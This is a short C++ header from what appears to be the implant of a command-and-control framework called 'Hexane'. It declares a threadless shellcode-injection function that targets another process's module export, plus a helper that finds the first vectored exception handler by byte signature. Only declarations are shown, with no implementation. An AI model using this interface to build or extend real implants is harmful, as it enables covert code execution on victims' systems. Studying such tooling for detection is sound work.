#ifndef HEXANE_IMPLANT_INJECT_HPP
#define HEXANE_IMPLANT_INJECT_HPP
#include <core/corelib.hpp>

struct _threadless {
    _mbs_buffer Parent;
    _mbs_buffer Module;
    _mbs_buffer Export;
    _mbs_buffer Loader;
    _mbs_buffer Opcode;
};

namespace Injection {
    FUNCTION VOID Threadless(_threadless threadless, void *shellcode, size_t n_shellcode, size_t total_length);

    namespace Veh {
        FUNCTION UINT_PTR GetFirstHandler(wchar_t *name, const char *signature, const char *mask);
    }
}
#endif //HEXANE_IMPLANT_INJECT_HPP
